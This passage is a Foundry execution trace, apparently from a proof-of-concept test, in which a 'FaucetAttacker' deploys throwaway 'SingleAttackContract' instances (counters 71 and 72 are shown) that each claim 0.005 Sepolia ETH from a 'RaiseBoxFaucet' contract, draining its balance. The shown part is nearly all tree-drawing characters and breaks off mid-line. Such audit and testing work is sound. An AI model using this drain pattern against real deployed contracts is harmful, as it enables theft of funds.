    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0xd113B0b4F92E0bA42Dd14e87974609634481B1Ed
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 71) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4472524] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4471765] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4435597] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4427939] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 640000000000000000 [6.4e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [220299] → new SingleAttackContract@0x4c89bE1179356F1eF0A1Be859AB220aE6Bd6649B
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 877 bytes of code
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [0] console::log("contract counter: ", 72) [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4170555] SingleAttackContract::callFaucet()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4169796] RaiseBoxFaucet::claimFaucetTokens()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4133628] SingleAttackContract::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [4125970] FaucetAttacker::receive{value: 5000000000000000}()
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [516] RaiseBoxFaucet::sepEthAmountToDrip() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 5000000000000000 [5e15]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   ├─ [380] RaiseBoxFaucet::getContractSepEthBalance() [staticcall]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 635000000000000000 [6.35e17]
    │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │   │ 